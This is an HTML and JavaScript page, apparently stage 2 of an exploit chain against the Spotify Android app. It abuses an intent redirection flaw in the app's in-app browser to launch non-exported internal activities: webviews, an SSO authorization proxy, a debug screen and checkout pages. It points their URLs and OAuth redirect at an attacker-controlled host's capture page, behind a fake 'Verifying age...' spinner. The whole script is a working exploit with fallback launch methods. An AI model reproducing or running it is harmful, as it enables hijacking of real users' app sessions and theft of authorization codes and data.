<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Loading...</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background: #121212;
            color: #fff;
        }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #333;
            border-top: 4px solid #1DB954;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        .container { text-align: center; }
        #status { margin-top: 16px; font-size: 14px; color: #b3b3b3; }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <div id="status">Verifying age...</div>
    </div>

    <script>
    // =============================================================
    // STAGE 2: Second-level Intent Redirection
    //
    // This page is loaded inside InAppBrowserActivity's WebView.
    //
    // URL parameters control behavior:
    //   ?mode=launcher  → Navigate to launcher.html (interactive menu of all non-exported activities)
    //   ?mode=auto      → Auto-launch ReportWebViewActivity (default, original chain)
    //   ?target=<id>    → Launch a specific activity from the launcher list
    //
    // The intent:// handler in InAppBrowserActivity (ivy.c() via mqp0.j())
    // parses the URI via Intent.parseUri() and launches it with
    // startActivity() - NO VALIDATION is performed on the target.
    // =============================================================

    var ATTACKER_SERVER = "https://folklorxdnelsaka.github.io/idkwebview";
    var PKG = "com.spotify.music";

    // Parse URL params
    var params = new URLSearchParams(window.location.search);
    var mode = params.get('mode') || 'auto';
    var target = params.get('target');

    // Activity definitions for targeted launches
    var targets = {
        report: {
            name: "ReportWebViewActivity",
            uri: "intent://report#Intent;"
                + "component=" + PKG + "/com.spotify.reporting.reportaction.ReportWebViewActivity;"
                + "S.report_webview_url=" + encodeURIComponent(ATTACKER_SERVER + "/capture.html") + ";"
                + "end"
        },
        messaging: {
            name: "MessagingUtilsInternalWebviewActivity",
            uri: "intent://messaging#Intent;"
                + "component=" + PKG + "/com.spotify.messaging.messagingutils.MessagingUtilsInternalWebviewActivity;"
                + "S.inapp_internalwebview_uri=" + encodeURIComponent(ATTACKER_SERVER + "/capture.html") + ";"
                + "end"
        },
        paml: {
            name: "PremiumAccountManagementWebviewActivity",
            uri: "intent://paml#Intent;"
                + "component=" + PKG + "/com.spotify.premiumaccountmanagement.management.page.PremiumAccountManagementWebviewActivity;"
                + "S.inapp_internalwebview_uri=" + encodeURIComponent(ATTACKER_SERVER + "/capture.html") + ";"
                + "end"
        },
        checkout: {
            name: "PremiumCheckoutActivity",
            uri: "intent://checkout#Intent;"
                + "component=" + PKG + "/com.spotify.checkout.premiumcheckout.PremiumCheckoutActivity;"
                + "end"
        },
        auth: {
            name: "AuthorizationActivityInternalProxy",
            uri: "intent://auth#Intent;"
                + "component=" + PKG + "/com.spotify.appauthorization.sso.internalauth.AuthorizationActivityInternalProxy;"
                + "S.client_id=exploit_test;"
                + "S.redirect_uri=" + encodeURIComponent(ATTACKER_SERVER + "/capture.html") + ";"
                + "S.response_type=code;"
                + "end"
        },
        debug: {
            name: "RemoteConfigurationDebugActivity",
            uri: "intent://debug#Intent;"
                + "component=" + PKG + "/com.spotify.remoteconfig.debugfeature.RemoteConfigurationDebugActivity;"
                + "end"
        },
        google: {
            name: "GoogleCheckoutActivity",
            uri: "intent://checkout#Intent;"
                + "component=" + PKG + "/com.spotify.gpb.googlecheckout.GoogleCheckoutActivity;"
                + "end"
        },
        spotifycheckout: {
            name: "SpotifyCheckoutActivity",
            uri: "intent://checkout#Intent;"
                + "component=" + PKG + "/com.spotify.checkout.spotifycheckout.SpotifyCheckoutActivity;"
                + "end"
        }
    };

    function navigate(uri, name) {
        document.getElementById('status').textContent = 'Launching ' + (name || 'target') + '...';

        // Method 1: window.location.href
        setTimeout(function() {
            window.location.href = uri;
        }, 500);

        // Method 2: iframe fallback
        setTimeout(function() {
            var iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = uri;
            document.body.appendChild(iframe);
        }, 2000);

        // Method 3: anchor click fallback
        setTimeout(function() {
            var a = document.createElement('a');
            a.href = uri;
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();
        }, 3500);
    }

    // =========================================================
    // Mode selection
    // =========================================================

    if (mode === 'launcher') {
        // Redirect to the full interactive launcher page
        document.getElementById('status').textContent = 'Loading launcher...';
        setTimeout(function() {
            window.location.href = ATTACKER_SERVER + '/launcher.html';
        }, 300);

    } else if (target && targets[target]) {
        // Launch a specific activity
        var t = targets[target];
        navigate(t.uri, t.name);

    } else {
        // Default: Auto-launch ReportWebViewActivity (original attack chain)
        var defaultUri = "intent://report#Intent;"
            + "component=" + PKG + "/com.spotify.reporting.reportaction.ReportWebViewActivity;"
            + "S.report_webview_url=" + encodeURIComponent(ATTACKER_SERVER + "/capture.html") + ";"
            + "end";

        navigate(defaultUri, "ReportWebViewActivity");
    }
    </script>
</body>
</html>
